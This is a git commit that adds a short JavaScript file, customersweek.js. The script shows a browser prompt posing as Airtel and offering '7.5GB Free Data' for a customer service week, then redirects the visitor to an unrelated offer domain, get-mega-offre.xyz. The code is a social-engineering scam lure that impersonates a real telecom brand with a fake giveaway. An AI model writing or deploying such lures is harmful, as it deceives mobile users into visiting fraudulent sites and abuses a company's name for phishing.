904a60d6f09d7e8bf7ca0d7e5c7cf7de85bea73f
bigetijazz9 <bigetijazz9@gmail.com>
2024-10-28 06:24:04 -0700

    Create customersweek.js

---
+++ customersweek.js
@@ -0,0 +1,6 @@
+
+var password = 'ACTIVATE 7.5GB'
+password=prompt('Airtel: Hello Customer, We are offering 7.5GB Free Data in celebration of "CUSTOMERS SERVICE WEEK" to ACTIVATE your 7.5GB, press OK to claim now','ACTIVATE 7.5GB');
+if (password != 'ACTIVATE 7.5GB') {
+location.href='https://www.get-mega-offre.xyz/data-bonus';
+}
